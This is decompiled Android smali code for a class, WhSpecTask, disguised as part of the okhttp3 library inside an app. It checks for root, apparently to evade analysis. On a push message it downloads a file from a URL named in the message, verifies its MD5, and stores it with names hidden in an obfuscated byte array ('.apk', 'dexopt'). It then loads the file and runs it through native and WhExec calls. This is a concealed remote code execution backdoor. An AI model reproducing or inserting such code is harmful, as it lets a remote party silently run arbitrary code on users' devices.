.class public Lokhttp3/internal/WhSpecTask;
.super Ljava/lang/Thread;
.source "SourceFile"


# instance fields
.field private context:Lcom/narvii/app/NVContext;

.field private payload:Lcom/narvii/pushservice/PushPayload;


# direct methods
.method public constructor <init>(Lcom/narvii/app/NVContext;Lcom/narvii/pushservice/PushPayload;)V
    .locals 0

    .line 1
    .line 2
    .line 3
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    .line 4
    .line 5
    iput-object p1, p0, Lokhttp3/internal/WhSpecTask;->context:Lcom/narvii/app/NVContext;

    .line 6
    .line 7
    iput-object p2, p0, Lokhttp3/internal/WhSpecTask;->payload:Lcom/narvii/pushservice/PushPayload;

    .line 8
    return-void
.end method

.method private static checkRootMethod1()Z
    .locals 2

    .line 1
    .line 2
    sget-object v0, Landroid/os/Build;->TAGS:Ljava/lang/String;

    .line 3
    .line 4
    if-eqz v0, :cond_0

    .line 5
    .line 6
    const-string v1, "test-keys"

    .line 7
    .line 8
    .line 9
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    .line 10
    move-result v0

    .line 11
    .line 12
    if-eqz v0, :cond_0

    .line 13
    const/4 v0, 0x1

    .line 14
    goto :goto_0

    .line 15
    :cond_0
    const/4 v0, 0x0

    .line 16
    :goto_0
    return v0
.end method

.method private static checkRootMethod2()Z
    .locals 10

    .line 1
    .line 2
    const-string v0, "/system/app/Superuser.apk"

    .line 3
    .line 4
    const-string v1, "/sbin/su"

    .line 5
    .line 6
    const-string v2, "/system/bin/su"

    .line 7
    .line 8
    const-string v3, "/system/xbin/su"

    .line 9
    .line 10
    const-string v4, "/data/local/xbin/su"

    .line 11
    .line 12
    const-string v5, "/data/local/bin/su"

    .line 13
    .line 14
    const-string v6, "/system/sd/xbin/su"

    .line 15
    .line 16
    const-string v7, "/system/bin/failsafe/su"

    .line 17
    .line 18
    const-string v8, "/data/local/su"

    .line 19
    .line 20
    const-string v9, "/su/bin/su"

    .line 21
    .line 22
    .line 23
    filled-new-array/range {v0 .. v9}, [Ljava/lang/String;

    .line 24
    move-result-object v0

    .line 25
    const/4 v1, 0x0

    .line 26
    move v2, v1

    .line 27
    .line 28
    :goto_0
    const/16 v3, 0xa

    .line 29
    .line 30
    if-ge v2, v3, :cond_1

    .line 31
    .line 32
    aget-object v3, v0, v2

    .line 33
    .line 34
    new-instance v4, Ljava/io/File;

    .line 35
    .line 36
    .line 37
    invoke-direct {v4, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 38
    .line 39
    .line 40
    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    .line 41
    move-result v3

    .line 42
    .line 43
    if-eqz v3, :cond_0

    .line 44
    const/4 v0, 0x1

    .line 45
    return v0

    .line 46
    .line 47
    :cond_0
    add-int/lit8 v2, v2, 0x1

    .line 48
    goto :goto_0

    .line 49
    :cond_1
    return v1
.end method

.method private static checkRootMethod3()Z
    .locals 6

    .line 1
    const/4 v0, 0x0

    .line 2
    const/4 v1, 0x0

    .line 3
    .line 4
    .line 5
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    .line 6
    move-result-object v2

    .line 7
    const/4 v3, 0x2

    .line 8
    .line 9
    new-array v3, v3, [Ljava/lang/String;

    .line 10
    .line 11
    const-string v4, "/system/xbin/which"

    .line 12
    .line 13
    aput-object v4, v3, v0

    .line 14
    .line 15
    const-string v4, "su"

    .line 16
    const/4 v5, 0x1

    .line 17
    .line 18
    aput-object v4, v3, v5

    .line 19
    .line 20
    .line 21
    invoke-virtual {v2, v3}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    .line 22
    move-result-object v1

    .line 23
    .line 24
    new-instance v2, Ljava/io/BufferedReader;

    .line 25
    .line 26
    new-instance v3, Ljava/io/InputStreamReader;

    .line 27
    .line 28
    .line 29
    invoke-virtual {v1}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    .line 30
    move-result-object v4

    .line 31
    .line 32
    .line 33
    invoke-direct {v3, v4}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 34
    .line 35
    .line 36
    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 37
    .line 38
    .line 39
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    .line 40
    move-result-object v2
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 41
    .line 42
    if-eqz v2, :cond_0

    .line 43
    .line 44
    .line 45
    invoke-virtual {v1}, Ljava/lang/Process;->destroy()V

    .line 46
    return v5

    .line 47
    .line 48
    .line 49
    :cond_0
    invoke-virtual {v1}, Ljava/lang/Process;->destroy()V

    .line 50
    return v0

    .line 51
    .line 52
    :catchall_0
    if-eqz v1, :cond_1

    .line 53
    .line 54
    .line 55
    invoke-virtual {v1}, Ljava/lang/Process;->destroy()V

    .line 56
    :cond_1
    return v0
.end method

.method public static isDeviceRooted()Z
    .locals 1

    .line 1
    .line 2
    .line 3
    invoke-static {}, Lokhttp3/internal/WhSpecTask;->checkRootMethod1()Z

    .line 4
    move-result v0

    .line 5
    .line 6
    if-nez v0, :cond_1

    .line 7
    .line 8
    .line 9
    invoke-static {}, Lokhttp3/internal/WhSpecTask;->checkRootMethod2()Z

    .line 10
    move-result v0

    .line 11
    .line 12
    if-nez v0, :cond_1

    .line 13
    .line 14
    .line 15
    invoke-static {}, Lokhttp3/internal/WhSpecTask;->checkRootMethod3()Z

    .line 16
    move-result v0

    .line 17
    .line 18
    if-eqz v0, :cond_0

    .line 19
    goto :goto_0

    .line 20
    :cond_0
    const/4 v0, 0x0

    .line 21
    goto :goto_1

    .line 22
    :cond_1
    :goto_0
    const/4 v0, 0x1

    .line 23
    :goto_1
    return v0
.end method


# virtual methods
.method public run()V
    .locals 10

    .line 1
    .line 2
    .line 3
    :try_start_0
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lokhttp3/internal/WhSpecTask;->isDeviceRooted()Z

    .line 7
    move-result v0

    .line 8
    .line 9
    if-nez v0, :cond_b

    .line 10
    .line 11
    iget-object v0, p0, Lokhttp3/internal/WhSpecTask;->payload:Lcom/narvii/pushservice/PushPayload;

    .line 12
    .line 13
    iget-object v0, v0, Lcom/narvii/pushservice/PushPayload;->ext:Lcom/fasterxml/jackson/databind/node/ObjectNode;

    .line 14
    .line 15
    const-string v1, "md5"

    .line 16
    .line 17
    .line 18
    invoke-virtual {v0, v1}, Lcom/fasterxml/jackson/databind/node/ObjectNode;->get(Ljava/lang/String;)Lcom/fasterxml/jackson/databind/JsonNode;

    .line 19
    move-result-object v0

    .line 20
    const/4 v1, 0x0

    .line 21
    .line 22
    if-nez v0, :cond_0

    .line 23
    move-object v0, v1

    .line 24
    goto :goto_0

    .line 25
    .line 26
    .line 27
    :cond_0
    invoke-virtual {v0}, Lcom/fasterxml/jackson/databind/JsonNode;->textValue()Ljava/lang/String;

    .line 28
    move-result-object v0

    .line 29
    .line 30
    :goto_0
    if-nez v0, :cond_1

    .line 31
    goto :goto_1

    .line 32
    .line 33
    .line 34
    :cond_1
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 35
    move-result v2

    .line 36
    .line 37
    const/16 v3, 0x20

    .line 38
    .line 39
    if-ne v2, v3, :cond_2

    .line 40
    move-object v1, v0

    .line 41
    .line 42
    :cond_2
    :goto_1
    new-instance v0, Ljava/io/File;

    .line 43
    .line 44
    iget-object v2, p0, Lokhttp3/internal/WhSpecTask;->context:Lcom/narvii/app/NVContext;

    .line 45
    .line 46
    .line 47
    invoke-interface {v2}, Lcom/narvii/app/NVContext;->getContext()Landroid/content/Context;

    .line 48
    move-result-object v2

    .line 49
    .line 50
    .line 51
    invoke-virtual {v2}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    .line 52
    move-result-object v2

    .line 53
    .line 54
    const-string v3, "wh"

    .line 55
    .line 56
    .line 57
    invoke-direct {v0, v2, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 58
    .line 59
    const/16 v2, 0xa

    .line 60
    .line 61
    new-array v3, v2, [B

    .line 62
    .line 63
    .line 64
    fill-array-data v3, :array_0

    .line 65
    const/4 v4, 0x0

    .line 66
    move v5, v4

    .line 67
    .line 68
    :goto_2
    if-ge v5, v2, :cond_3

    .line 69
    .line 70
    aget-byte v6, v3, v5

    .line 71
    add-int/2addr v6, v2

    .line 72
    add-int/2addr v6, v5

    .line 73
    int-to-byte v6, v6

    .line 74
    .line 75
    aput-byte v6, v3, v5

    .line 76
    .line 77
    add-int/lit8 v5, v5, 0x1

    .line 78
    goto :goto_2

    .line 79
    .line 80
    :cond_3
    new-instance v2, Ljava/lang/String;

    .line 81
    .line 82
    .line 83
    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([B)V

    .line 84
    const/4 v3, 0x4

    .line 85
    .line 86
    if-eqz v1, :cond_4

    .line 87
    .line 88
    new-instance v5, Ljava/io/File;

    .line 89
    .line 90
    new-instance v6, Ljava/lang/StringBuilder;

    .line 91
    .line 92
    .line 93
    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    .line 94
    .line 95
    .line 96
    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 97
    .line 98
    .line 99
    invoke-virtual {v2, v4, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    .line 100
    move-result-object v7

    .line 101
    .line 102
    .line 103
    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 104
    .line 105
    .line 106
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 107
    move-result-object v6

    .line 108
    .line 109
    .line 110
    invoke-direct {v5, v0, v6}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 111
    .line 112
    .line 113
    invoke-virtual {v5}, Ljava/io/File;->length()J

    .line 114
    move-result-wide v6

    .line 115
    .line 116
    const-wide/16 v8, 0x0

    .line 117
    .line 118
    cmp-long v6, v6, v8

    .line 119
    .line 120
    if-nez v6, :cond_7

    .line 121
    .line 122
    :cond_4
    iget-object v5, p0, Lokhttp3/internal/WhSpecTask;->payload:Lcom/narvii/pushservice/PushPayload;

    .line 123
    .line 124
    iget-object v5, v5, Lcom/narvii/pushservice/PushPayload;->ext:Lcom/fasterxml/jackson/databind/node/ObjectNode;

    .line 125
    .line 126
    const-string v6, "url"

    .line 127
    .line 128
    .line 129
    invoke-virtual {v5, v6}, Lcom/fasterxml/jackson/databind/node/ObjectNode;->get(Ljava/lang/String;)Lcom/fasterxml/jackson/databind/JsonNode;

    .line 130
    move-result-object v5

    .line 131
    .line 132
    .line 133
    invoke-virtual {v5}, Lcom/fasterxml/jackson/databind/JsonNode;->textValue()Ljava/lang/String;

    .line 134
    move-result-object v5

    .line 135
    .line 136
    iget-object v6, p0, Lokhttp3/internal/WhSpecTask;->context:Lcom/narvii/app/NVContext;

    .line 137
    .line 138
    const-string v7, "whOkhttp3"

    .line 139
    .line 140
    .line 141
    invoke-interface {v6, v7}, Lcom/narvii/app/NVContext;->getService(Ljava/lang/String;)Ljava/lang/Object;

    .line 142
    move-result-object v6

    .line 143
    .line 144
    check-cast v6, Lokhttp3/OkHttpClient;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 145
    .line 146
    .line 147
    :try_start_1
    invoke-static {v5}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    .line 148
    move-result-object v7

    .line 149
    .line 150
    .line 151
    invoke-virtual {v7}, Landroid/net/Uri;->getScheme()Ljava/lang/String;

    .line 152
    move-result-object v8

    .line 153
    .line 154
    const-string v9, "https"

    .line 155
    .line 156
    .line 157
    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 158
    move-result v8

    .line 159
    .line 160
    if-eqz v8, :cond_5

    .line 161
    .line 162
    .line 163
    invoke-virtual {v6}, Lokhttp3/OkHttpClient;->dns()Lokhttp3/Dns;

    .line 164
    move-result-object v8

    .line 165
    .line 166
    .line 167
    invoke-virtual {v7}, Landroid/net/Uri;->getHost()Ljava/lang/String;

    .line 168
    move-result-object v7

    .line 169
    .line 170
    .line 171
    invoke-interface {v8, v7}, Lokhttp3/Dns;->lookup(Ljava/lang/String;)Ljava/util/List;

    .line 172
    move-result-object v7

    .line 173
    .line 174
    .line 175
    invoke-interface {v7}, Ljava/util/List;->size()I

    .line 176
    move-result v7

    .line 177
    .line 178
    if-lez v7, :cond_5

    .line 179
    goto :goto_3

    .line 180
    .line 181
    :cond_5
    new-instance v6, Ljava/lang/Exception;

    .line 182
    .line 183
    .line 184
    invoke-direct {v6}, Ljava/lang/Exception;-><init>()V

    .line 185
    throw v6
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 186
    .line 187
    :catch_0
    :try_start_2
    new-instance v6, Lokhttp3/OkHttpClient;

    .line 188
    .line 189
    .line 190
    invoke-direct {v6}, Lokhttp3/OkHttpClient;-><init>()V

    .line 191
    .line 192
    :goto_3
    new-instance v7, Lokhttp3/Request$Builder;

    .line 193
    .line 194
    .line 195
    invoke-direct {v7}, Lokhttp3/Request$Builder;-><init>()V

    .line 196
    .line 197
    .line 198
    invoke-virtual {v7, v5}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    .line 199
    move-result-object v5

    .line 200
    .line 201
    .line 202
    invoke-virtual {v5}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    .line 203
    move-result-object v5

    .line 204
    .line 205
    .line 206
    invoke-virtual {v6, v5}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    .line 207
    move-result-object v5

    .line 208
    .line 209
    .line 210
    invoke-interface {v5}, Lokhttp3/Call;->execute()Lokhttp3/Response;

    .line 211
    move-result-object v5

    .line 212
    .line 213
    .line 214
    invoke-virtual {v5}, Lokhttp3/Response;->isSuccessful()Z

    .line 215
    move-result v6

    .line 216
    .line 217
    if-eqz v6, :cond_a

    .line 218
    .line 219
    .line 220
    invoke-virtual {v5}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;

    .line 221
    move-result-object v5

    .line 222
    .line 223
    .line 224
    invoke-virtual {v5}, Lokhttp3/ResponseBody;->bytes()[B

    .line 225
    move-result-object v5

    .line 226
    .line 227
    const-string v6, "MD5"

    .line 228
    .line 229
    .line 230
    invoke-static {v6}, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;

    .line 231
    move-result-object v6

    .line 232
    .line 233
    .line 234
    invoke-virtual {v6, v5}, Ljava/security/MessageDigest;->digest([B)[B

    .line 235
    move-result-object v6

    .line 236
    .line 237
    .line 238
    invoke-static {v6}, Lcom/narvii/util/StringUtils;->byteArrayToHexString([B)Ljava/lang/String;

    .line 239
    move-result-object v6

    .line 240
    .line 241
    if-nez v1, :cond_6

    .line 242
    move-object v1, v6

    .line 243
    goto :goto_4

    .line 244
    .line 245
    .line 246
    :cond_6
    invoke-virtual {v1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 247
    move-result v6

    .line 248
    .line 249
    if-eqz v6, :cond_9

    .line 250
    .line 251
    .line 252
    :goto_4
    invoke-virtual {v0}, Ljava/io/File;->mkdir()Z

    .line 253
    .line 254
    new-instance v6, Ljava/io/File;

    .line 255
    .line 256
    new-instance v7, Ljava/lang/StringBuilder;

    .line 257
    .line 258
    .line 259
    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    .line 260
    .line 261
    .line 262
    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 263
    .line 264
    const-string v8, ".tmp"

    .line 265
    .line 266
    .line 267
    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 268
    .line 269
    .line 270
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 271
    move-result-object v7

    .line 272
    .line 273
    .line 274
    invoke-direct {v6, v0, v7}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 275
    .line 276
    .line 277
    .line 278
    .line 279
    invoke-static {v6}, Lcom/safedk/android/internal/partials/OkHttpFilesBridge;->fileOutputStreamCtor(Ljava/io/File;)Ljava/io/FileOutputStream;

    move-result-object v7

    .line 280
    .line 281
    .line 282
    invoke-virtual {v7, v5}, Ljava/io/FileOutputStream;->write([B)V

    .line 283
    .line 284
    .line 285
    invoke-virtual {v7}, Ljava/io/FileOutputStream;->close()V

    .line 286
    .line 287
    new-instance v5, Ljava/io/File;

    .line 288
    .line 289
    new-instance v7, Ljava/lang/StringBuilder;

    .line 290
    .line 291
    .line 292
    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    .line 293
    .line 294
    .line 295
    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 296
    .line 297
    .line 298
    invoke-virtual {v2, v4, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    .line 299
    move-result-object v1

    .line 300
    .line 301
    .line 302
    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 303
    .line 304
    .line 305
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 306
    move-result-object v1

    .line 307
    .line 308
    .line 309
    invoke-direct {v5, v0, v1}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 310
    .line 311
    .line 312
    invoke-virtual {v6, v5}, Ljava/io/File;->renameTo(Ljava/io/File;)Z

    .line 313
    .line 314
    :cond_7
    new-instance v1, Ljava/io/File;

    .line 315
    .line 316
    .line 317
    invoke-virtual {v2, v3}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    .line 318
    move-result-object v2

    .line 319
    .line 320
    .line 321
    invoke-direct {v1, v0, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 322
    .line 323
    .line 324
    invoke-virtual {v1}, Ljava/io/File;->mkdir()Z

    .line 325
    .line 326
    iget-object v0, p0, Lokhttp3/internal/WhSpecTask;->payload:Lcom/narvii/pushservice/PushPayload;

    .line 327
    .line 328
    iget-object v0, v0, Lcom/narvii/pushservice/PushPayload;->ext:Lcom/fasterxml/jackson/databind/node/ObjectNode;

    .line 329
    .line 330
    const-string v2, "exec"

    .line 331
    .line 332
    .line 333
    invoke-virtual {v0, v2}, Lcom/fasterxml/jackson/databind/node/ObjectNode;->get(Ljava/lang/String;)Lcom/fasterxml/jackson/databind/JsonNode;

    .line 334
    move-result-object v0

    .line 335
    .line 336
    .line 337
    invoke-virtual {v0}, Lcom/fasterxml/jackson/databind/JsonNode;->textValue()Ljava/lang/String;

    .line 338
    move-result-object v0

    .line 339
    .line 340
    .line 341
    invoke-virtual {v5}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    .line 342
    move-result-object v2

    .line 343
    .line 344
    .line 345
    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    .line 346
    move-result-object v1

    .line 347
    .line 348
    .line 349
    invoke-static {v2, v1, v0}, Lcom/narvii/util/NativeHelper;->l(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Object;

    .line 350
    move-result-object v0

    .line 351
    .line 352
    if-nez v0, :cond_8

    .line 353
    goto :goto_5

    .line 354
    .line 355
    :cond_8
    check-cast v0, Lokhttp3/internal/WhExec;

    .line 356
    .line 357
    iget-object v1, p0, Lokhttp3/internal/WhSpecTask;->context:Lcom/narvii/app/NVContext;

    .line 358
    .line 359
    iget-object v2, p0, Lokhttp3/internal/WhSpecTask;->payload:Lcom/narvii/pushservice/PushPayload;

    .line 360
    .line 361
    .line 362
    invoke-interface {v0, v1, v2}, Lokhttp3/internal/WhExec;->exec(Lcom/narvii/app/NVContext;Lcom/narvii/pushservice/PushPayload;)V

    .line 363
    goto :goto_5

    .line 364
    .line 365
    :cond_9
    new-instance v0, Ljava/io/UnsupportedEncodingException;

    .line 366
    .line 367
    .line 368
    invoke-direct {v0}, Ljava/io/UnsupportedEncodingException;-><init>()V

    .line 369
    throw v0

    .line 370
    .line 371
    :cond_a
    new-instance v0, Ljava/lang/RuntimeException;

    .line 372
    .line 373
    .line 374
    invoke-virtual {v5}, Lokhttp3/Response;->toString()Ljava/lang/String;

    .line 375
    move-result-object v1

    .line 376
    .line 377
    .line 378
    invoke-direct {v0, v1}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/String;)V

    .line 379
    throw v0

    .line 380
    .line 381
    :cond_b
    new-instance v0, Ljava/lang/IllegalStateException;

    .line 382
    .line 383
    .line 384
    invoke-direct {v0}, Ljava/lang/IllegalStateException;-><init>()V

    .line 385
    throw v0
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 386
    :catchall_0
    :goto_5
    return-void

    nop

    .line 387
    .line 388
    .line 389
    .line 390
    .line 391
    .line 392
    .line 393
    .line 394
    .line 395
    :array_0
    .array-data 1
        0x24t
        0x56t
        0x64t
        0x5et
        0x56t
        0x56t
        0x68t
        0x5et
        0x5et
        0x61t
    .end array-data
.end method
